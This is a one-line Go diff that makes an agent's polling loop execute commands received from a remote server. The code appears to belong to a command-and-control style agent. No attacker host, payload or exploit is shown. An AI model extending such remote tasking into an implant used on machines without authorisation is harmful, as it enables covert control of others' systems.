@@ -65,6 +65,7 @@ func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
 			} else {
 				if httpsResp.Job {
 					log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", httpsResp.Command, httpsResp.JobID)
+					currentAgent.ExecuteTask(response) // NEW: Execute the task
 				} else {
 					log.Printf("No job from Server")
 				}
